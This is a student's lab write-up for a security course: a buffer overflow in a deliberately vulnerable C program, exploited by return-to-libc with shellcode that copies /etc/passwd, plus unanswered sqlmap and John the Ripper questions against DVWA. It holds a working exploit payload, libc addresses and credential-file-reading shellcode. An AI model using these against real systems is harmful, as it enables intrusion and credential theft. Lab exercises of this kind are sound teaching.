# Lab #1,22110078, Nguyen Tien Toan, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    char local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:
## 1. Run the Docker virtual machine.
We will run the Docker virtual machine by this code: 

`docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab`

![image](https://github.com/user-attachments/assets/14fda446-1c85-444a-b89e-9439a4073ce5)

From now, we will do this task 1 on this Docker virtual machine. 

## 2. Compile the asm program
We will have the asm program name is shellcode.asm
We will use these codes to compile shellcode.asm:
`
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 -o shellcode shellcode.o
`

![image](https://github.com/user-attachments/assets/900c43ac-5768-4886-9b5b-50ce6ff74fa1)

So here, after compile, we have 2 new file: shellcode.o, shellcode.

## 3. Compile the the vulnerable C program
We will have the vulnerable C program name is vuln.c
We will use this code to compile vuln.c:
`
gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
`

![image](https://github.com/user-attachments/assets/bfc9496f-8017-46ef-b8a3-4171bec260b2)

After compile, we have new file: vuln.out

## 4. Draw stackframe
Base on code of vuln.c, we have this stackframe:
And in this task, we will use return-to-libc attack with environment variable. So that we also need the system() stackframe:

![image](https://github.com/user-attachments/assets/ebce8e06-deaf-4486-85df-ef6034f7027e)



## 5. Turn off the ASLR
We use this code to turn off the address space randomization on stack:
`
sudo sysctl -w kernel.randomize_va_space=0
`
![image](https://github.com/user-attachments/assets/e97f0eef-ccb6-4944-b789-fc60a2818a78)

## 6. Create the environment variable
Before create the environment variable, we use pwd to find the current path.
And out current path is: /home/seed/seclabs
We will create the environment variable by this code:
`
export copy_file="/home/seed/seclabs/shellcode"
`
![image](https://github.com/user-attachments/assets/d34cb24e-9ab3-400d-8b63-d212fd3fd7b6)

## 7. Find the address for the attack
We will use gdb peda to find the address
To enter to gdb, use this code:
`gdb -q vuln.out`

![image](https://github.com/user-attachments/assets/8c4392be-c5be-40a4-8da5-2728b7a30915)

Then use these code to find the address:
``
start
p system
p exit
find /home/seed/seclabs/shellcode
``

![image](https://github.com/user-attachments/assets/6f667139-73b2-4ee5-a207-4475f61274c6)

We have the address: 
- system: 0xf7e50db0 => \xb0\x0d\xe5\xf7
- exit: 0xf7e449e0 => \xe0\x49\xe4\f7
- /home/seed/seclabs/shellcode: 0xffffd94d => \x4d\xd9\xff\xff

## 8. Attack
From them and the stackframe, we have this code:
`
r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x4d\xd9\xff\xff')")
`
![image](https://github.com/user-attachments/assets/56e49dd2-494f-4366-9896-0b8c03400e63)

By this code, we will insert the address of system() into to return address of main() and then, it will execute the code of system(), and we also insert the exit() into the return address of system() (argc of main()) to avoid the segmentation fault after execute the system(), beside we also insert the variable (insert into agrv of main()) to complete the system() code.

## 9. Check result
The shellcode will copy /etc/passwd to /tmp/outfile. 
Therefore we can use this code to check for the result:
`
cat /tmp/outfile
`
![image](https://github.com/user-attachments/assets/42a5c06d-d5e5-4f93-b63d-2fc8e0421d34)
And by this picture, we can tell that the attack was successful.


# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:




